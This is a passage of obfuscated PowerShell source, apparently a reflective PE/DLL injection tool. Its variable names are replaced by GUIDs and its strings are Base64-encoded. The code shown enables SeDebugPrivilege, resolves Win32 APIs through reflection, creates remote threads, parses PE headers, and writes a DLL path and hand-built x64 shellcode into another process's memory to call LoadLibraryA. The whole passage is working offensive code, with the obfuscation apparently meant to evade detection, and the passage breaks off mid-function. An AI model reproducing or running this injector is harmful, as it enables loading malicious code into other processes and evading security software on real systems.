	    ${cddbbf275f3440f987e4845ca0309e64} = ${065aa676fc9640529d9c661c49eabd94}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${bb26c57f030c4db2b3cac75f65f5b966}, ${d41c87198d8d4717aac4ac7ff4a7b67c})
	    ${cddbbf275f3440f987e4845ca0309e64}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${065aa676fc9640529d9c661c49eabd94}.CreateType()
	}
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${b7891f66d60c4554bbfe6d034fc53491},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${a4f1238e7e2d40a6a4192f5ea6d3296f}
	    )
	    ${2c3493def7334039a9340035b934d09e} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${bb6fd844fa5c4b7f80cf8a6e8d90c73e} = ${2c3493def7334039a9340035b934d09e}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${d130d77430f24638a54836189df602de} = ${bb6fd844fa5c4b7f80cf8a6e8d90c73e}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${531fb553093c4600a842387ae47025f9} = ${bb6fd844fa5c4b7f80cf8a6e8d90c73e}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${06ca376167aa4a3b82dd95a6d45deb88} = ${d130d77430f24638a54836189df602de}.Invoke($null, @(${b7891f66d60c4554bbfe6d034fc53491}))
	    ${41d95d6bcb9440acad35476f3301194d} = New-Object IntPtr
	    ${b9fdc399e3cb440fa7b99a28125dee9c} = New-Object System.Runtime.InteropServices.HandleRef(${41d95d6bcb9440acad35476f3301194d}, ${06ca376167aa4a3b82dd95a6d45deb88})
	    echo ${531fb553093c4600a842387ae47025f9}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${b9fdc399e3cb440fa7b99a28125dee9c}, ${a4f1238e7e2d40a6a4192f5ea6d3296f}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede}
		)
		[IntPtr]$ThreadHandle = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.OpenThreadToken.Invoke($ThreadHandle, ${bf6addb5678a4306bbd927c2e94d4ede}.TOKEN_QUERY -bor ${bf6addb5678a4306bbd927c2e94d4ede}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false)
		{
			${de0d4a2b685b4b65ba55808c6111dea8} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${de0d4a2b685b4b65ba55808c6111dea8} -eq ${bf6addb5678a4306bbd927c2e94d4ede}.ERROR_NO_TOKEN)
			{
				${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.ImpersonateSelf.Invoke(3)
				if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.OpenThreadToken.Invoke($ThreadHandle, ${bf6addb5678a4306bbd927c2e94d4ede}.TOKEN_QUERY -bor ${bf6addb5678a4306bbd927c2e94d4ede}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: ${de0d4a2b685b4b65ba55808c6111dea8}"
			}
		}
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.LUID))
		${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), $PLuid)
		if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		${f38cbe45357f455988eae91a52d766ae} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]${c3c389d397344cdcb031960f029f7926}.TOKEN_PRIVILEGES)
		${f38cbe45357f455988eae91a52d766ae}.PrivilegeCount = 1
		${f38cbe45357f455988eae91a52d766ae}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]${c3c389d397344cdcb031960f029f7926}.LUID)
		${f38cbe45357f455988eae91a52d766ae}.Privileges.Attributes = ${bf6addb5678a4306bbd927c2e94d4ede}.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${f38cbe45357f455988eae91a52d766ae}, $TokenPrivilegesMem, $true)
		${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		${de0d4a2b685b4b65ba55808c6111dea8} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false) -or (${de0d4a2b685b4b65ba55808c6111dea8} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${d5e70cc477d14906a24cf0452a1000e4},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${dfccdc8a8c7748d3bab1a84f860772a5},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${bd568ae9e5b646148eec42947ae9f165} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}
		)
		[IntPtr]${ffd92a1946ca4af69da99842ef6b66bc} = [IntPtr]::Zero
		${91820c40e42b4df2bffe0cf152b1699f} = [Environment]::OSVersion.Version
		if ((${91820c40e42b4df2bffe0cf152b1699f} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${91820c40e42b4df2bffe0cf152b1699f} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: ${dfccdc8a8c7748d3bab1a84f860772a5}"
			${58993d6bfa7d492aae2457f9ea57c469}= ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.NtCreateThreadEx.Invoke([Ref]${ffd92a1946ca4af69da99842ef6b66bc}, 0x1FFFFF, [IntPtr]::Zero, ${d5e70cc477d14906a24cf0452a1000e4}, ${dfccdc8a8c7748d3bab1a84f860772a5}, ${bd568ae9e5b646148eec42947ae9f165}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${8eabd692c4cf44768bf561ce0074da42} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${ffd92a1946ca4af69da99842ef6b66bc} -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: ${58993d6bfa7d492aae2457f9ea57c469}. LastError: ${8eabd692c4cf44768bf561ce0074da42}"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: ${dfccdc8a8c7748d3bab1a84f860772a5}"
			${ffd92a1946ca4af69da99842ef6b66bc} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.CreateRemoteThread.Invoke(${d5e70cc477d14906a24cf0452a1000e4}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${dfccdc8a8c7748d3bab1a84f860772a5}, ${bd568ae9e5b646148eec42947ae9f165}, 0, [IntPtr]::Zero)
		}
		if (${ffd92a1946ca4af69da99842ef6b66bc} -eq [IntPtr]::Zero)
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA')))
		}
		return ${ffd92a1946ca4af69da99842ef6b66bc}
	}
	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${ae6ce24b24854af29680b1afe7ddb45a},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926}
		)
		${5ad44a75eaaf48c1a79a130185d93468} = New-Object System.Object
		${9aaafb3871a24ca0a66935e69e337917} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${ae6ce24b24854af29680b1afe7ddb45a}, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_DOS_HEADER)
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${ae6ce24b24854af29680b1afe7ddb45a}) ([Int64][UInt64]${9aaafb3871a24ca0a66935e69e337917}.e_lfanew))
		${5ad44a75eaaf48c1a79a130185d93468} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		${af24c3d82f8d4a69aa1ca37b45359c97} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_NT_HEADERS64)
	    if (${af24c3d82f8d4a69aa1ca37b45359c97}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${af24c3d82f8d4a69aa1ca37b45359c97}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${5ad44a75eaaf48c1a79a130185d93468} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${af24c3d82f8d4a69aa1ca37b45359c97}
			${5ad44a75eaaf48c1a79a130185d93468} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${6b16d55a605c4bf4a719ed6677976a46} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_NT_HEADERS32)
			${5ad44a75eaaf48c1a79a130185d93468} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${6b16d55a605c4bf4a719ed6677976a46}
			${5ad44a75eaaf48c1a79a130185d93468} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${5ad44a75eaaf48c1a79a130185d93468}
	}
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${dc16372125974a299ad4aa82bcfa6b2d},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926}
		)
		${c8edec2d3caf433f9746e28faa91f6ff} = New-Object System.Object
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${dc16372125974a299ad4aa82bcfa6b2d}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${dc16372125974a299ad4aa82bcfa6b2d}, 0, $UnmanagedPEBytes, ${dc16372125974a299ad4aa82bcfa6b2d}.Length) | Out-Null
		${5ad44a75eaaf48c1a79a130185d93468} = Get-ImageNtHeaders -ae6ce24b24854af29680b1afe7ddb45a $UnmanagedPEBytes -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926}
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${5ad44a75eaaf48c1a79a130185d93468}.PE64Bit)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		return ${c8edec2d3caf433f9746e28faa91f6ff}
	}
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${ae6ce24b24854af29680b1afe7ddb45a},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede}
		)
		if (${ae6ce24b24854af29680b1afe7ddb45a} -eq $null -or ${ae6ce24b24854af29680b1afe7ddb45a} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${c8edec2d3caf433f9746e28faa91f6ff} = New-Object System.Object
		${5ad44a75eaaf48c1a79a130185d93468} = Get-ImageNtHeaders -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a} -c3c389d397344cdcb031960f029f7926 ${c3c389d397344cdcb031960f029f7926}
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${ae6ce24b24854af29680b1afe7ddb45a}
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${5ad44a75eaaf48c1a79a130185d93468}.NtHeadersPtr)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${5ad44a75eaaf48c1a79a130185d93468}.PE64Bit)
		${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${c8edec2d3caf433f9746e28faa91f6ff}.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_NT_HEADERS64)))
			${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_NT_HEADERS32)))
			${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		if ((${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_FILE_DLL) -eq ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_FILE_DLL)
		{
			${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${5ad44a75eaaf48c1a79a130185d93468}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_FILE_EXECUTABLE_IMAGE) -eq ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${c8edec2d3caf433f9746e28faa91f6ff} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${c8edec2d3caf433f9746e28faa91f6ff}
	}
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${bc96a39c79d24a35b88ba52e143fe2a2},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${ea82af90d6994548958606af6a94d6be}
		)
		${acafad3a2a75412893cf40bcdc32329b} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${4b48e9e7cba040e0bb53a7c8c26134db} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${ea82af90d6994548958606af6a94d6be})
		${bb1fa8dd20ce446fb5357ee9865bdd26} = [UIntPtr][UInt64]([UInt64]${4b48e9e7cba040e0bb53a7c8c26134db}.Length + 1)
		${0b4d34d2fdbd4d7b9e317c39f815e031} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, ${bb1fa8dd20ce446fb5357ee9865bdd26}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE)
		if (${0b4d34d2fdbd4d7b9e317c39f815e031} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WriteProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${0b4d34d2fdbd4d7b9e317c39f815e031}, ${ea82af90d6994548958606af6a94d6be}, ${bb1fa8dd20ce446fb5357ee9865bdd26}, [Ref]$NumBytesWritten)
		if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${bb1fa8dd20ce446fb5357ee9865bdd26} -ne $NumBytesWritten)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${7e8c5e022873429894a5b4a7f0911dca} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${0ff4fbfed554441e87b4602e4367edec} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke(${7e8c5e022873429894a5b4a7f0911dca}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]$DllAddress = [IntPtr]::Zero
		if (${c8edec2d3caf433f9746e28faa91f6ff}.PE64Bit -eq $true)
		{
			${41da3e2357f34b9fbc673df90d645d59} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, ${bb1fa8dd20ce446fb5357ee9865bdd26}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE)
			if (${41da3e2357f34b9fbc673df90d645d59} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${72ed730592384778aa47cb3d58c20ef0} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${3078c4367738458ea8a05c54a1426c7e} = @(0x48, 0xba)
			${735a18c5f05a483da3389f0e5dc711a4} = @(0xff, 0xd2, 0x48, 0xba)
			${fc7940d945ef45cebf72bc11f48ed9c4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${4af5a9f574b6494298ae9f4ee83f56b7} = ${72ed730592384778aa47cb3d58c20ef0}.Length + ${3078c4367738458ea8a05c54a1426c7e}.Length + ${735a18c5f05a483da3389f0e5dc711a4}.Length + ${fc7940d945ef45cebf72bc11f48ed9c4}.Length + (${acafad3a2a75412893cf40bcdc32329b} * 3)
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${4af5a9f574b6494298ae9f4ee83f56b7})
			${4c46ae8af4724383abfdb3ea89625a14} = ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${72ed730592384778aa47cb3d58c20ef0} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${72ed730592384778aa47cb3d58c20ef0}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${0b4d34d2fdbd4d7b9e317c39f815e031}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${3078c4367738458ea8a05c54a1426c7e} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${3078c4367738458ea8a05c54a1426c7e}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${0ff4fbfed554441e87b4602e4367edec}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${735a18c5f05a483da3389f0e5dc711a4} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${735a18c5f05a483da3389f0e5dc711a4}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${41da3e2357f34b9fbc673df90d645d59}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
